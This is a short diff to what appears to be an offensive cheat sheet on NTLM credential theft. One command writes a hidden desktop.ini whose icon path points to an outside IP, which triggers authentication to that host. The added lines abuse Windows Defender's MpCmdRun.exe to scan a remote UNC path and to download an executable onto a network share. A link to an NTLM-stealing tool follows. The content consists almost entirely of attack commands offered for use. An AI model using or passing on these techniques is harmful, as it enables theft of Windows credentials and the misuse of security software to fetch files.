@@ -46,6 +46,10 @@ echo [.ShellClassInfo] > desktop.ini <br/>
 echo IconResource\=\\\\1.2.3.4\\aa >> desktop.ini <br/>
 attrib +s +h desktop.ini
 
+## Windows Defender MpCmdRun
+"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe" -Scan  -ScanType 3 -File \\\\Server.domain\\file.txt
+"c:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -url https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe -path \\\\Server.domain\\
+
 ## Proxy bypass adress is Intranet for NTLM auto auth
 https://github.com/Gl3bGl4z/steal_NTLM_ncat
 
